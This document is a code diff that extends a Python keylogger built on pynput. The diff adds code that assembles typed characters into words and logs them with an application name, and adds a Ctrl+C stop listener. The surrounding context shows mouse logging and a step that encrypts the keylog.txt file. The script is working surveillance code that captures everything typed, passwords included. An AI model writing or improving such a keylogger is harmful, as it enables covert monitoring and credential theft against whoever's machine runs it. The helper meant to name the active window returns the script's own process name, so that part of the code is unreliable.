@@ -16,6 +16,9 @@ def get_active_window_process_name():
     active_window = psutil.Process(os.getpid())
     return active_window.name()
 
+# Initialize a variable to store the current text input
+current_text = []
+
 def on_press(key):
     try:
         app_name = get_active_window_process_name()
@@ -24,7 +27,19 @@ def on_press(key):
         logging.info(f"Special key pressed: {key} in {app_name}")
 
 def on_release(key):
+    global current_text
     app_name = get_active_window_process_name()
+    if hasattr(key, 'char') and key.char is not None:
+        current_text.append(key.char)
+    elif key == keyboard.Key.space:
+        current_text.append(' ')
+    elif key == keyboard.Key.enter:
+        current_text.append('\n')
+
+    if key == keyboard.Key.space or key == keyboard.Key.enter:
+        logging.info(f"Text input: {''.join(current_text)} in {app_name}")
+        current_text = []
+
     logging.info(f"Key released: {key} in {app_name}")
     if key == keyboard.Key.esc:
         return False
@@ -40,6 +55,15 @@ def on_scroll(x, y, dx, dy):
     app_name = get_active_window_process_name()
     logging.info(f"Mouse scrolled at ({x}, {y}) with delta ({dx}, {dy}) in {app_name}")
 
+def stop_listeners():
+    keyboard_listener.stop()
+    mouse_listener.stop()
+
+def on_key_combination(key):
+    if key == keyboard.KeyCode.from_char('\x03'):  # Ctrl + C
+        stop_listeners()
+        return False
+
 # Set up the keyboard listener
 keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
 keyboard_listener.start()
@@ -48,8 +72,13 @@ keyboard_listener.start()
 mouse_listener = mouse.Listener(on_click=on_click, on_scroll=on_scroll)
 mouse_listener.start()
 
+# Set up the key combination listener
+key_combination_listener = keyboard.Listener(on_press=on_key_combination)
+key_combination_listener.start()
+
 keyboard_listener.join()
 mouse_listener.join()
+key_combination_listener.join()
 
 # Encrypt the log file
 with open("keylog.txt", "rb") as file:
